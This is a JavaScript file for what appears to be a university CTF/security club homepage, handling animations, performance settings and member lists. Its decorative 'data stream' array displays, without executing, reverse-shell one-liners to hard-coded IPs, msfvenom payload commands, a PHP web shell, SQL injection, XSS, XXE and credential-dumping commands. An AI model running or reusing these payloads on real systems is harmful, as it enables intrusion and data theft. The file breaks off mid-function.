// 性能档位管理
let performanceLevel = 'medium'; // low, medium, high
let isMobile = false; // 将在DOMContentLoaded中正确设置

// 性能档位切换功能
function switchPerformanceLevel(level) {
    if (performanceLevel === level) return;
    
    performanceLevel = level;
    
    // 更新UI状态
    document.querySelectorAll('.performance-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-level="${level}"]`).classList.add('active');
    
    // 保存到本地存储
    localStorage.setItem('tkctf-performance-level', level);
    
    // 重新创建特效元素
    recreateEffects();
}

// 重新创建特效元素
function recreateEffects() {
    // 重新创建数据流
    const dataStreamsContainer = document.getElementById('dataStreams');
    if (dataStreamsContainer) {
        dataStreamsContainer.innerHTML = '';
        createDataStreams();
    }
    
    // 重新创建频谱
    createBinarySpectrum();
    
    // 重新设置元素初始状态
    const config = getPerformanceConfig();
    const selectors = [
        '.content-section',
        '.president-item',
        '.president-members',
        '.role-tag',
        '.code-name'
    ];

    selectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(element => {
            // 清除所有动画状态类
            element.classList.remove('fade-in-visible');
            
            if (!config.enableFadeAnimations && (selector === '.role-tag' || selector === '.code-name')) {
                element.style.opacity = '1';
                element.style.transform = 'translateY(0)';
                element.style.transition = 'none';
            } else {
                element.style.opacity = '0';
                element.style.transform = 'translateY(30px)';
                element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            }
        });
    });
    
    // 重新触发动画
    setTimeout(() => {
        animateOnScroll();
    }, 100);
}

// 性能档位控件折叠功能
function togglePerformanceToggle() {
    const toggle = document.getElementById('performanceToggle');
    const collapseIcon = document.querySelector('.collapse-icon');
    
    if (!isPerformanceToggleCollapsed) {
        // 即将折叠：记录当前高度
        const currentHeight = toggle.offsetHeight;
        if (currentHeight > 0) {
            savedToggleHeight = currentHeight;
        }
    }
    
    isPerformanceToggleCollapsed = !isPerformanceToggleCollapsed;
    
    if (isPerformanceToggleCollapsed) {
        toggle.classList.add('collapsed');
        collapseIcon.textContent = '<';
        
        // 应用保存的高度
        if (savedToggleHeight > 0) {
            toggle.style.height = savedToggleHeight + 'px';
        }
    } else {
        toggle.classList.remove('collapsed');
        collapseIcon.textContent = '>';
        
        // 移除固定高度，让内容自然撑开
        toggle.style.height = '';
    }
    
    // 保存状态到localStorage
    localStorage.setItem('tkctf-performance-toggle-collapsed', isPerformanceToggleCollapsed);
    
    // 更新位置以避免与nav冲突
    updatePerformanceTogglePosition();
}

// 更新性能档位控件位置（简化版）
function updatePerformanceTogglePosition() {
    // 直接调用NAV位置检查函数
    checkNavPosition();
}

// 检查NAV位置并调整性能控件位置
function checkNavPosition() {
    const nav = document.querySelector('nav');
    const toggle = document.getElementById('performanceToggle');
    
    if (!nav || !toggle) return;
    
    const navRect = nav.getBoundingClientRect();
    const toggleRect = toggle.getBoundingClientRect();
    const isWideScreen = window.innerWidth >= 768;
    const defaultTop = isWideScreen ? 20 : 10;
    
    // 检查NAV是否已经置顶（固定在顶部）
    // NAV置顶的判断：NAV的top值接近20px（sticky top: 20px）
    const isNavSticky = navRect.top <= 25; // 允许5px的误差
    
    
    if (isNavSticky) {
        // NAV已置顶，检查控件底边是否与NAV上边线碰撞
        const toggleBottom = defaultTop + toggleRect.height;
        const navTop = navRect.top;
        
        // 检查垂直碰撞：控件底边 >= NAV上边线
        const verticalCollision = toggleBottom >= navTop;
        
        // 检查水平重叠：两个元素在水平方向有重叠
        const horizontalOverlap = !(navRect.right < toggleRect.left || navRect.left > toggleRect.right);
        
        // 只有当垂直碰撞且水平重叠时才避让
        const shouldAvoid = verticalCollision && horizontalOverlap;
        
        
        if (shouldAvoid) {
            // 只有在当前没有避让时才进行避让
            if (!isAvoidingNav) {
                const newTop = navTop + navRect.height + 10; // NAV底部 + 10px间距
                toggle.style.top = newTop + 'px';
                isAvoidingNav = true;
            }
        } else {
            // 只有在当前正在避让时才恢复默认位置
            if (isAvoidingNav) {
                toggle.style.top = defaultTop + 'px';
                isAvoidingNav = false;
            }
        }
    } else {
        // NAV未置顶，确保控件在默认位置
        if (isAvoidingNav) {
            toggle.style.top = defaultTop + 'px';
            isAvoidingNav = false;
        }
    }
}

// 获取性能档位配置
function getPerformanceConfig() {
    const baseConfig = {
        low: {
            // 低档位：当前优化版本
            dataStreamCount: isMobile ? 4 : 12,
            binaryStreamCount: isMobile ? Math.floor(8 * 0.2) : 8,
            spectrumBarCount: isMobile ? Math.floor(window.innerWidth / 24) : Math.floor(window.innerWidth / 12),
            spectrumBarWidth: isMobile ? 16 : 8,
            enableBinaryDigits: false,
            enableSpectrumHighlight: false,
            enableDataStreamGlitch: false,
            enableLogoBeats: false,
            enableFadeAnimations: false,
            particleCount: isMobile ? 12 : 18,
            dataStreamDrift: isMobile ? 30 : 100,
            typewriterWaitTime: 4500 
        },
        medium: {
            // 中档位：在低档位基础上加上10个二进制数字
            dataStreamCount: isMobile ? 8 : 16,
            binaryStreamCount: isMobile ? Math.floor(8 * 0.5) : 8,
            spectrumBarCount: isMobile ? Math.floor(window.innerWidth / 24) : Math.floor(window.innerWidth / 12), // 保持低档位密度
            spectrumBarWidth: isMobile ? 16 : 8, // 保持低档位宽度
            enableBinaryDigits: true,
            enableSpectrumHighlight: true,
            enableDataStreamGlitch: true,
            enableLogoBeats: true,
            enableFadeAnimations: true,
            particleCount: isMobile ? 15 : 20,
            dataStreamDrift: isMobile ? 50 : 100,
            typewriterWaitTime: 3500 
        },
        high: {
            // 高档位：使用现在中档位的模式
            dataStreamCount: isMobile ? 12 : 20,
            binaryStreamCount: isMobile ? 8 : 8,
            spectrumBarCount: isMobile ? Math.floor(window.innerWidth / 18) : Math.floor(window.innerWidth / 12), // 使用原中档位密度
            spectrumBarWidth: isMobile ? 12 : 8, 
            enableBinaryDigits: true,
            enableSpectrumHighlight: true,
            enableDataStreamGlitch: true,
            enableLogoBeats: true,
            enableFadeAnimations: true,
            particleCount: isMobile ? 18 : 20,
            dataStreamDrift: isMobile ? 100 : 100,
            typewriterWaitTime: 2500 
        }
    };
    
    return baseConfig[performanceLevel];
}

// 创建数据流系统
function createDataStreams() {
    const container = document.getElementById('dataStreams');
    const config = getPerformanceConfig();
    const streamCount = config.dataStreamCount;

    // 数据流内容数组
    const dataTypes = [
        '0x4D5A90000300000004000000FFFF0000B800000000000000400000',
        'GET /api/security HTTP/1.1',
        'POST /login HTTP/1.1\nContent-Type: application/json',
        'Connection: keep-alive\nAuthorization: Bearer eyJ0eXAi',
        'SELECT * FROM users WHERE id = ?',
        'UNION SELECT username,password FROM admin',
        'INSERT INTO logs (timestamp, event) VALUES',
        'nmap -sS -O target.com',
        'hydra -l admin -P passwords.txt ssh://target',
        'john --wordlist=rockyou.txt hash.txt',
        'sqlmap -u "http://target.com/login.php"',
        'python3 exploit.py --target 192.168.1.100',
        'U2VjcmV0OiBCR00gT04gKyBkaXYgRm9vdGVyIOKGk+KGk+KGkw==',
        'use exploit/multi/handler',
        'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
        'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f elf -o reverse.elf',
        'ncat.exe%20112.34.55.67%204444%20-e%20cmd',
        '/bin/bash -i >& /dev/tcp/112.34.55.67/4444 0>&1',
        'nc -lvnp 4444',
        'msfconsole -q -x "use exploit/multi/handler"',
        'curl -X POST -d "username=admin&password=123"',
        'wireshark -i eth0 -f "tcp port 80"',
        'tcpdump -i any -w capture.pcap',
        'openssl s_client -connect target.com:443',
        'ssh-keygen -t rsa -b 4096',
        'gpg --gen-key --default-new-key-algo rsa4096',
        'hashcat -a 0 -m 1000 hashes.txt wordlist.txt',
        'aircrack-ng -w wordlist.txt capture.cap',
        'dirb http://target.com/ /usr/share/wordlists/',
        'gobuster dir -u http://target.com -w wordlist.txt',
        '<script>alert("XSS")</script>',
        '../../../../etc/passwd',
        '{{7*7}}[[7*7]]',
        '<?php system($_GET["cmd"]); ?>',
        'eval(base64_decode("c3lzdGVtKCRfR0VUWyJjbWQiXSk7"))',
        'LDAP injection: *)(&(objectClass=*)',
        'XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
        // 更多SQL注入
        "' OR '1'='1' --",
        "'; DROP TABLE users; --",
        "' UNION SELECT NULL,username,password FROM admin --",
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
        // 网络扫描和侦察
        'masscan -p1-65535 --rate=1000 192.168.1.0/24',
        'nmap -sV -sC -A target.com',
        'nmap --script vuln target.com',
        'nikto -h http://target.com',
        'whatweb http://target.com',
        'fierce -dns target.com',
        'dnsrecon -d target.com -t brt',
        'sublist3r -d target.com',
        // 暴力破解
        'medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh',
        'patator ssh_login host=192.168.1.100 user=admin password=FILE0 0=passwords.txt',
        'crackmapexec smb 192.168.1.0/24 -u admin -p password123',
        'wpscan --url http://target.com --enumerate u,p',
        // 漏洞利用框架
        'use auxiliary/scanner/smb/smb_version',
        'use exploit/windows/smb/ms17_010_eternalblue',
        'set RHOSTS 192.168.1.100',
        'exploit -j',
        'search cve:2021-44228',
        'use post/windows/gather/hashdump',
        // Payload生成
        'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.0.87 LPORT=443 -f exe -o payload.exe',
        'msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f raw > shell.php',
        'msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.0.87 LPORT=4444 -f war > shell.war',
        // 反弹Shell变种
        'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'10.10.0.87\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);"',
        'php -r "$sock=fsockopen(\'10.10.0.87\',4444);exec(\'/bin/sh -i <&3 >&3 2>&3\');"',
        'ruby -rsocket -e"f=TCPSocket.open(\'10.10.0.87\',4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)"',
        'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.10.0.87\',4444);"',
        // 网络嗅探和分析
        'ettercap -T -M arp:remote /192.168.1.1// /192.168.1.100//',
        'arpspoof -i eth0 -t 192.168.1.100 192.168.1.1',
        'responder -I eth0 -rdw',
        'mitmdump -s script.py',
        // 密码破解
        'hashcat -a 3 -m 1000 hashes.txt ?a?a?a?a?a?a',
        'john --format=NT hashes.txt',
        'ophcrack -t tables/ -f hashes.txt',
        'fcrackzip -D -p rockyou.txt archive.zip',
        // 无线网络
        'airodump-ng wlan0mon',
        'aireplay-ng -0 10 -a 00:11:22:33:44:55 wlan0mon',
        'aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture.cap',
        'wifite --kill',
        'kismet -c wlan0',
        // Web目录扫描
        'ffuf -w wordlist.txt -u http://target.com/FUZZ',
        'dirsearch -u http://target.com -e php,html,js',
        'feroxbuster -u http://target.com -w wordlist.txt',
        'wfuzz -w wordlist.txt http://target.com/FUZZ',
        // 数据库攻击
        'sqlmap -u "http://target.com/page.php?id=1" --dbs',
        'sqlmap -u "http://target.com/page.php?id=1" --dump-all',
        'sqlmap -u "http://target.com/page.php?id=1" --os-shell',
        'NoSQLMap -t mongodb://target.com:27017',
        // 社会工程学
        'setoolkit',
        'gophish server --listen 0.0.0.0:3333',
        'beef-xss',
        'shellphish',
        // 后渗透
        'mimikatz # sekurlsa::logonpasswords',
        'bloodhound-python -d domain.local -u user -p pass -gc dc.domain.local -c all',
        'winpeas.exe',
        'linpeas.sh',
        'privilege escalation: sudo -l',
        'find / -perm -u=s -type f 2>/dev/null',
        // 流量分析
        'tshark -i eth0 -f "tcp port 80" -w capture.pcap',
        'tcpflow -i eth0 -c',
        'dsniff -i eth0',
        'urlsnarf -i eth0',
        // 取证和日志分析
        'volatility -f memory.dump imageinfo',
        'autopsy case.db',
        'grep -r "error" /var/log/',
        'logstash -f config.conf',
        'steghide embed -cf image.jpg -ef secret.txt',
        'binwalk -e firmware.bin',
        'strings binary | grep -i password',
        'hexdump -C file.bin | head -20',
        // API测试
        'burpsuite --config-file=config.json',
        'postman collection run security-tests.json',
        'owasp-zap-cli quick-scan --self-contained http://target.com',
        'curl -X GET "http://target.com/api/users" -H "Authorization: Bearer token123"'
    ];

    for (let i = 0; i < streamCount; i++) {
        const stream = document.createElement('div');
        stream.className = 'data-stream';

        const randomData = dataTypes[Math.floor(Math.random() * dataTypes.length)];
        stream.textContent = randomData;
        // 为字符级柔光提供数据：用于 ::after 复写文本
        stream.setAttribute('data-text', randomData);

        const startX = Math.random() * window.innerWidth;
        // 根据性能档位调整抖动程度
        const driftX = (Math.random() - 0.5) * config.dataStreamDrift;
        const delay = Math.random() * 8;

        stream.style.left = startX + 'px';
        stream.style.setProperty('--drift-x', driftX + 'px');
        stream.style.animationDelay = `-${delay}s`;

        container.appendChild(stream);
    }

    // 创建二进制数据流
    createBinaryStreams();
}

// 创建二进制数据流
function createBinaryStreams() {
    const container = document.getElementById('dataStreams');
    const config = getPerformanceConfig();
    const binaryCount = config.binaryStreamCount;

    for (let i = 0; i < binaryCount; i++) {
        const stream = document.createElement('div');
        stream.className = 'binary-stream';

        // 生成随机二进制字符串
        let binaryString = '';
        for (let j = 0; j < 80; j++) {
            binaryString += Math.random() > 0.5 ? '1' : '0';
            if (j % 8 === 7) binaryString += ' ';
        }
        stream.textContent = binaryString;
        // 为字符级柔光提供数据：用于 ::after 复写文本
        stream.setAttribute('data-text', binaryString);

        const startY = Math.random() * window.innerHeight;
        const delay = Math.random() * 20;

        stream.style.top = startY + 'px';
        stream.style.animationDelay = `-${delay}s`;

        container.appendChild(stream);
    }
}

// 平滑滚动
function smoothScroll(target) {
    const element = document.querySelector(target);
    if (element) {
        // 计算导航栏高度和h2标题高度的偏移
        const nav = document.querySelector('nav');
        const h2 = element.querySelector('h2');
        const navHeight = nav ? nav.offsetHeight : 0;
        const h2Height = h2 ? h2.offsetHeight : 0;
        const offset = navHeight + h2Height; 
        
        const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
        const offsetPosition = elementPosition - offset;
        
        window.scrollTo({
            top: offsetPosition,
            behavior: 'smooth'
        });
    }
}

// 为导航链接添加平滑滚动
document.querySelectorAll('nav a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        smoothScroll(this.getAttribute('href'));
    });
});

// 详细的滚动淡入动画
function animateOnScroll() {
    const windowHeight = window.innerHeight;
    const triggerPoint = windowHeight * 0.7; // 当元素进入视口70%时触发（更灵敏）

    // 需要淡入的元素选择器（移除content-section，单独处理）
    const config = getPerformanceConfig();
    const selectors = config.enableFadeAnimations ? [
        '.president-item',
        '.contact-item',
        '#friendsList',  
        '.president-members',
        '.member-row',
        '.role-tag',
        '.code-name'
    ] : [
        '.president-item',
        '.president-members',
        '#friendsList'  
    ];

    // 单独处理content-section元素（触发点更低，动画更慢）
    const contentSections = document.querySelectorAll('.content-section');
    contentSections.forEach((element, index) => {
        // 跳过已经显示的元素
        if (element.classList.contains('fade-in-visible')) return;

        const elementTop = element.getBoundingClientRect().top;
        const elementHeight = element.getBoundingClientRect().height;
        
        // section元素在视口50%时触发（更低的触发点）
        const sectionTriggerPoint = windowHeight * 0.85;
        const elementVisibleHeight = elementHeight * 0.05; // 5%的高度
        const isInView = elementTop < (sectionTriggerPoint - elementVisibleHeight) && elementTop > -elementHeight;
        
        if (isInView) {
            // 添加延迟，让section依次出现
            const delay = index * 100; // 每个section延迟100ms
            
            setTimeout(() => {
            element.style.opacity = '1';
            element.style.transform = 'translateY(0)';
                element.classList.add('fade-in-visible');
                
                // section元素使用1.5秒的慢动画
                element.style.transition = 'opacity 1.5s ease, transform 1.5s ease';
            }, delay);
        }
    });

    selectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach((element, index) => {
            // 跳过已经显示的元素
            if (element.classList.contains('fade-in-visible')) return;

        const elementTop = element.getBoundingClientRect().top;
            const elementHeight = element.getBoundingClientRect().height;
            
            // 计算元素是否在视口内 - 元素露出10%高度就触发
            const elementVisibleHeight = elementHeight * 0.05; // 5%的高度
            const isInView = elementTop < (windowHeight - elementVisibleHeight) && elementTop > -elementHeight;
            
            if (isInView) {
                // 添加延迟，让元素依次出现
                const delay = index * 50; // 每个元素延迟50ms
                
                setTimeout(() => {
            element.style.opacity = '1';
            element.style.transform = 'translateY(0)';
                    element.classList.add('fade-in-visible');
                    
                    // 调试友链显示
                    if (element.id === 'friendsList') {
                        // 友链淡入触发
                    }
                }, delay);
            }
        });
    });
}

// 返回顶部按钮控制
function handleBackToTop() {
    const backToTopBtn = document.getElementById('backToTop');
    const footer = document.querySelector('footer');
    
    if (!backToTopBtn) return;
    
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    const footerTop = footer ? footer.getBoundingClientRect().top + window.pageYOffset : Infinity;
    const windowHeight = window.innerHeight;
    const isMobile = window.innerWidth < 768;
    const defaultBottom = isMobile ? 20 : 30;
    const buttonHeight = isMobile ? 45 : 50;
    
    // 滚动超过200px时显示按钮
    if (scrollTop > 200) {
        backToTopBtn.classList.add('show');
        
        // 如果按钮会与footer重叠，调整位置（只需要10px间距）
        const buttonBottom = scrollTop + windowHeight - buttonHeight - defaultBottom;
        if (buttonBottom + buttonHeight + 10 > footerTop) {
            const newBottom = (scrollTop + windowHeight) - footerTop + 10;
            backToTopBtn.style.bottom = newBottom + 'px';
        } else {
            backToTopBtn.style.bottom = defaultBottom + 'px';
        }
    } else {
        backToTopBtn.classList.remove('show');
    }
}

// 返回顶部功能
function scrollToTop() {
    // 重置persistentGlow状态
    resetBounceHeight();
    
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// 加载并渲染成员数据
async function loadAndRenderMembers() {
    try {
        const response = await fetch('./data/members.json');
        const data = await response.json();
        
        // 渲染社长数据
        renderPresidents(data.presidents);
        
        // 渲染社员数据
        renderMembers(data.members);
        
    } catch (error) {
        console.error('加载成员数据失败:', error);
        // 如果加载失败，保持原有显示
    }
}

// 加载并渲染友链数据
async function loadAndRenderFriends() {
    try {
        const response = await fetch('./data/friends.json');
        const data = await response.json();
        
        // 渲染友链数据
        renderFriends(data.friends);
        
    } catch (error) {
        console.error('加载友链数据失败:', error);
        // 如果加载失败，保持原有显示
    }
}

// 渲染社长数据
function renderPresidents(presidentsData) {
    const presidentsList = document.getElementById('presidentsList');
    if (!presidentsList) return;
    
    // 按年份排序（从早到晚）
    const years = Object.keys(presidentsData).sort((a, b) => a - b);
    
    presidentsList.innerHTML = '';
    
    years.forEach((year, index) => {
        const yearData = presidentsData[year];
        if (!yearData) return;
        
        // 创建主席项目容器
        const presidentItem = document.createElement('div');
        presidentItem.className = 'president-item';
        
        // 设置初始状态
        presidentItem.style.opacity = '0';
        presidentItem.style.transform = 'translateY(30px)';
        presidentItem.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        presidentItem.style.animationDelay = `${index * 300}ms`; // 每个主席延迟300ms
        
        // 创建年份标题
        const yearElement = document.createElement('div');
        yearElement.className = 'president-year';
        yearElement.textContent = `${year}届扛把子`;
        presidentItem.appendChild(yearElement);
        
        // 创建成员名称容器
        const namesElement = document.createElement('div');
        namesElement.className = 'president-names';
        presidentItem.appendChild(namesElement);
        
        // 创建成就内容
        const achievementsElement = document.createElement('div');
        achievementsElement.className = 'achievements';
        achievementsElement.innerHTML = yearData.achievements || '主要成就：暂无记录';
        presidentItem.appendChild(achievementsElement);
        
        if (!yearData.members || yearData.members.length === 0) {
            // 成员信息缺失特殊处理
            const unknownSpan = document.createElement('span');
            unknownSpan.className = 'unknown-member';
            unknownSpan.innerHTML = '> Error: Permission denied（细节有待考证）<span class="blinking-cursor">_</span>';
            namesElement.appendChild(unknownSpan);
        } else {
            // 创建成员容器
            const membersContainer = document.createElement('div');
            membersContainer.className = 'president-members';
            
            // 设置初始状态
            membersContainer.style.opacity = '0';
            membersContainer.style.transform = 'translateY(30px)';
            membersContainer.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            
            yearData.members.forEach((member, memberIndex) => {
                const memberRow = document.createElement('div');
                memberRow.className = 'member-row';
                memberRow.style.animationDelay = `${memberIndex * 0.1}s`;
                
                // 设置初始状态
                memberRow.style.opacity = '0';
                memberRow.style.transform = 'translateY(30px)';
                memberRow.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                
                // 姓名
                const nameSpan = document.createElement('span');
                nameSpan.className = 'member-name';
                nameSpan.textContent = member.name;
                memberRow.appendChild(nameSpan);
                
                // 角色标签 - 分离负责人和特殊身份
                member.roles.forEach(role => {
                    const roleTag = document.createElement('span');
                    let roleClass;
                    
                    // 判断是负责人身份还是特殊身份
                    if (isSpecialRole(role)) {
                        roleClass = getSpecialRoleClass(role);
                    } else {
                        roleClass = getResponsibleRoleClass(role);
                    }
                    
                    roleTag.className = `role-tag ${roleClass}`;
                    roleTag.textContent = role;
                    
                    // 设置初始状态
                    const config = getPerformanceConfig();
                    if (!config.enableFadeAnimations) {
                        // 低档位直接显示，不设置淡入动画
                        roleTag.style.opacity = '1';
                        roleTag.style.transform = 'translateY(0)';
                        roleTag.style.transition = 'none';
                    } else {
                        roleTag.style.opacity = '0';
                        roleTag.style.transform = 'translateY(30px)';
                        roleTag.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                    }
                    
                    // 如果是多负责人角色，为每个负责人标签都应用动态光流效果
                    if (isMultiRole(member.roles) && !isSpecialRole(role)) {
                        applyMultiRoleEffect(roleTag, member.roles);
                    }
                    
                    memberRow.appendChild(roleTag);
                });
                
                // 代号 - 支持打字机效果
                const codeSpan = document.createElement('span');
                if (!member.codeName || member.codeName.trim() === '') {
                    codeSpan.className = 'code-name null';
                    codeSpan.textContent = 'Error: code-name not found';
                } else {
                    codeSpan.className = 'code-name';
                    // 启动打字机效果
                    startTypewriterEffect(codeSpan, member.codeName);
                }
                
                // 设置初始状态
                const config = getPerformanceConfig();
                if (!config.enableFadeAnimations) {
                    // 低档位直接显示，不设置淡入动画
                    codeSpan.style.opacity = '1';
                    codeSpan.style.transform = 'translateY(0)';
                    codeSpan.style.transition = 'none';
                } else {
                    codeSpan.style.opacity = '0';
                    codeSpan.style.transform = 'translateY(30px)';
                    codeSpan.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
                }
                
                memberRow.appendChild(codeSpan);
                
                membersContainer.appendChild(memberRow);
            });
            
            namesElement.appendChild(membersContainer);
        }
        
        presidentsList.appendChild(presidentItem);
    });
}

// 渲染社员数据
function renderMembers(membersData) {
    const membersList = document.getElementById('membersList');
    if (!membersList) return;
    
    // 按年份排序（从新到旧）
    const years = Object.keys(membersData).sort((a, b) => b - a);
    
    membersList.innerHTML = '';
    
    years.forEach((year, index) => {
        const yearData = membersData[year];
        if (!yearData) return;
        
        // 创建成员组容器
        const memberGroup = document.createElement('div');
        memberGroup.className = 'member-group';
        
        
        // 创建年份标题
        const yearElement = document.createElement('div');
        yearElement.className = 'member-year';
        yearElement.textContent = `${year}届`;
        memberGroup.appendChild(yearElement);
        
        // 创建成员列表
        const listElement = document.createElement('div');
        listElement.className = 'member-list';
        
        if (yearData.length === 0) {
            listElement.textContent = '（待补充）';
        } else {
            listElement.textContent = yearData.join('、');
        }
        
        memberGroup.appendChild(listElement);
        membersList.appendChild(memberGroup);
    });
}

// 渲染友链数据
function renderFriends(friendsData) {
    const friendsList = document.getElementById('friendsList');
    if (!friendsList) return;
    
    // 创建友链链接数组
    const friendLinks = friendsData.map(friend => {
        return `<a href="${friend.url}" target="_blank">${friend.name}</a>`;
    });
    
    // 使用顿号分割显示
    friendsList.innerHTML = `<p>${friendLinks.join('、')}</p>`;
    
    // 设置初始状态（在内容创建后）
    friendsList.style.opacity = '0';
    friendsList.style.transform = 'translateY(30px)';
    friendsList.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
}

// 打字机效果函数
function startTypewriterEffect(element, codeName) {
    // 检查是否包含多个代号（用/分割）
    const codeNames = codeName.includes('/') ? codeName.split('/') : [codeName];
    let currentIndex = 0;
    let isTyping = true;
    let currentText = '';
    
    // 从性能配置中获取等待时间
    const config = getPerformanceConfig();
    const waitTime = config.typewriterWaitTime;
    
    function typeText() {
        const targetText = codeNames[currentIndex].trim();
        
        if (isTyping) {
            // 打字阶段
            if (currentText.length < targetText.length) {
                currentText = targetText.substring(0, currentText.length + 1);
                element.textContent = currentText;
                setTimeout(typeText, 100 + Math.random() * 100); // 随机打字速度
            } else {
                // 打字完成，根据性能配置等待时间
                setTimeout(() => {
                    isTyping = false;
                    typeText();
                }, waitTime);
            }
        } else {
            // 删除阶段
            if (currentText.length > 0) {
                currentText = currentText.substring(0, currentText.length - 1);
                element.textContent = currentText;
                setTimeout(typeText, 50); // 删除速度较快
            } else {
                // 删除完成，切换到下一个代号
                currentIndex = (currentIndex + 1) % codeNames.length;
                isTyping = true;
                setTimeout(typeText, 200); // 短暂停顿后开始下一个
            }
        }
    }
    
    // 开始打字机效果
    typeText();
}

// 检查是否为特殊补充身份
function isSpecialRole(role) {
    const roleLower = role.toLowerCase();
    return roleLower.includes('研发总监') || roleLower.includes('社团新晋指导老师');
}

// 获取负责人身份对应的CSS类
function getResponsibleRoleClass(role) {
    const roleLower = role.toLowerCase();
    
    // 技术类负责人
    if (roleLower.includes('技术') || roleLower.includes('攻防')) {
        return 'tech';
    }
    
    // 行政类负责人
    if (roleLower.includes('行政运营')) {
        return 'admin';
    }
    
    // 竞赛类负责人
    if (roleLower.includes('竞赛')) {
        return 'competition';
    }
    
    // 宣传类负责人
    if (roleLower.includes('宣传')) {
        return 'promotion';
    }
    
    // 默认
    return 'default';
}

// 获取特殊身份对应的CSS类
function getSpecialRoleClass(role) {
    const roleLower = role.toLowerCase();
    
    if (roleLower.includes('研发总监')) {
        return 'director';
    }
    
    if (roleLower.includes('社团新晋指导老师')) {
        return 'teacher';
    }
    
    return 'default';
}

// 检查是否为多角色（只考虑负责人身份）
function isMultiRole(roles) {
    const responsibleRoles = roles.filter(role => !isSpecialRole(role));
    
    // 检查负责人角色是否包含多个身份（用/分割）
    const roleTypes = new Set();
    responsibleRoles.forEach(role => {
        // 如果角色包含/，说明是多个身份的合并
        if (role.includes('/')) {
            const subRoles = role.split('/');
            subRoles.forEach(subRole => {
                const roleClass = getResponsibleRoleClass(subRole.trim());
                roleTypes.add(roleClass);
            });
        } else {
            const roleClass = getResponsibleRoleClass(role);
            roleTypes.add(roleClass);
        }
    });
    
    return roleTypes.size > 1;
}

// 根据负责人身份生成光流颜色
function generateMultiRoleColors(roles) {
    const colorMap = {
        'tech': '#4a36ff',
        'admin': '#11ffff', 
        'competition': '#ffbe32',
        'promotion': '#ff9ff3',
        'default': '#39b8eb'
    };
    
    const uniqueColors = new Set();
    const responsibleRoles = roles.filter(role => !isSpecialRole(role));
    
    responsibleRoles.forEach(role => {
        // 如果角色包含/，分割并处理每个子角色
        if (role.includes('/')) {
            const subRoles = role.split('/');
            subRoles.forEach(subRole => {
                const roleClass = getResponsibleRoleClass(subRole.trim());
                uniqueColors.add(colorMap[roleClass]);
            });
        } else {
            const roleClass = getResponsibleRoleClass(role);
            uniqueColors.add(colorMap[roleClass]);
        }
    });
    
    return Array.from(uniqueColors);
}

// 为多角色元素应用静态多段渐变效果
function applyMultiRoleEffect(element, roles) {
    const colors = generateMultiRoleColors(roles);
    
    if (colors.length <= 1) {
        return;
    }
    
    // 生成静态多段渐变
    const gradientStops = colors.map((color, index) => {
        const position = (index / (colors.length - 1)) * 100;
        return `${color} ${position}%`;
    }).join(', ');
    
    element.style.background = `linear-gradient(135deg, ${gradientStops})`;
    element.style.border = '1px solid rgba(255, 255, 255, 0.4)';
    element.style.boxShadow = '0 0 20px rgba(255, 255, 255, 0.5)';
}

// 初始化
document.addEventListener('DOMContentLoaded', function() {
    // 正确设置移动端检测
    isMobile = window.innerWidth < 768;
    
    // 初始化滚动位置
    lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    
    createDataStreams();
    createBinarySpectrum();

    // 设置所有元素的初始状态
    const config = getPerformanceConfig();
    const selectors = [
        '.content-section',
        '.president-item',
        // '.member-group',
        // '.contact-item',
        // '.friendsList',
        '.president-members',
        // '.member-row',
        '.role-tag',
        '.code-name'
    ];

    selectors.forEach(selector => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(element => {
            // 根据性能档位设置淡入动画
            if (!config.enableFadeAnimations && (selector === '.role-tag' || selector === '.code-name')) {
                element.style.opacity = '1';
                element.style.transform = 'translateY(0)';
                element.style.transition = 'none';
            } else {
                element.style.opacity = '0';
                element.style.transform = 'translateY(30px)';
                element.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
            }
        });
    });

    // 立即检查一次
    animateOnScroll();
    
    // 加载并渲染成员数据
    loadAndRenderMembers();
    
    // 加载并渲染友链数据
    loadAndRenderFriends();
    
    // 确保about-title正确显示
    const aboutTitle = document.querySelector('.about-title');
    if (aboutTitle) {
        // 延迟一点时间确保动画能正常触发
        setTimeout(() => {
            aboutTitle.classList.add('loaded');
        }, 100);
    }
    
    
    // 绑定返回顶部按钮事件
    const backToTopBtn = document.getElementById('backToTop');
    if (backToTopBtn) {
        backToTopBtn.addEventListener('click', scrollToTop);
    }
    
    // 新增：绑定Logo点击事件
    const logoContainer = document.getElementById('logoContainer');
    const audio = document.getElementById('bgmAudio');
    
    if (logoContainer && audio) {
        // 加载SVG文件
        loadLogoSVG();
        
        // 初始化鼠标跟随效果
        initMouseFollow();
        
        logoContainer.addEventListener('click', handleLogoClick);
        audio.addEventListener('ended', handleAudioEnd);
    
